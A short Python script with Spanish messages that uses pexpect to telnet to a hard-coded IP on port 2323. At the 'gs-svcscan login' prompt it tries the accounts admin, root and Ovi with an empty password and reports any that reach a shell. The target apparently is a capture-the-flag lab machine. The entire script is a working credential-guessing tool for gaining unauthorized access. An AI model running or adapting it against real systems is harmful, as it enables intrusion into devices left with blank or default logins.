#!/usr/bin/env python3

import signal
import pexpect
import sys

def def_handler(sig,frame):
    print("Saliendo del programa...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

HOST= "10.129.65.74"
PORT= "2323"
users = ["admin", "root", "Ovi"]

for user in users:
    try:
        print(f"Probando acceso sin contraseña para {user}")
        # Lanzar telnet a HOST
        child = pexpect.spawn(f"telnet {HOST} {PORT}", timeout=7)
        # Esperando el pront de login
        child.expect(r"gs-svcscan login: ?", timeout=15)
        # Enviar Usuario
        child.sendline(user)

        index = child.expect(
            [
                r"gs-svcscan login: ?",
                r"Password: ?",
                r"[$#]"
            ],
            timeout=5
        )

        if index == 1:
            child.sendline("")
            index2 = child.expect(
                [
                    r"gs-svcscan login: ?",
                    r"Login incorrect",
                    r"[$#]"
                ],
                timeout=5
            )
            if index2 == 2:
                print(f"[+] Acceso con el usuario {user}\n")
                child.sendline("exit")
                child.close()
                break
            else:
                print(f"[!] El usuario {user} no es valido sin contraseña\n ")
                child.close()
        elif index == 2:
            print(f"[+] El usuario {user} es valido!")
            child.sendline("exit")
            child.close()
            break
        else:
            print(f"[!] Fallo con el ususario {user}")
            child.close()

    except Exception as e:
        print(f"Error: {e}")









